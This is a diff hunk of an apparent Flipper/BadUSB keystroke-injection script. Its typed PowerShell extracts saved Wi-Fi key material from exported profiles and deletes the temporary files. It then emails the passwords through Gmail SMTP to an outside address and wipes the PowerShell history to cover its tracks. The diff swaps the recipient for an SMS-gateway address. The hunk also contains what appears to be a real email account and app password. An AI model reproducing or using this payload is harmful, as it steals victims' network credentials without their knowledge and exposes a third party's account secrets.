@@ -10,7 +10,7 @@ DELAY 500
 STRING Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-fi.txt; $WiFi = [IO.File]::ReadAllText(".\Wi-fi.txt"); rm Wi-*
 ENTER
 DELAY 500
-STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nguyenthenhat74@gmail.com', 'uhtq tbwr rlxt borw'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'nguyenthenhat74@gmail.com'; $ReportEmail.To.Add('nguyenthenhat74@gmail.com'); $ReportEmail.Body = "Flipper Report: $Wifi"; $SMTPInfo.Send($ReportEmail)
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nguyenthenhat74@gmail.com', 'uhtq tbwr rlxt borw'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'nguyenthenhat74@gmail.com'; $ReportEmail.To.Add('0488757750@optusmobile.com.au'); $ReportEmail.Body = "Flipper Report: $Wifi"; $SMTPInfo.Send($ReportEmail)
 ENTER
 DELAY 500
 STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
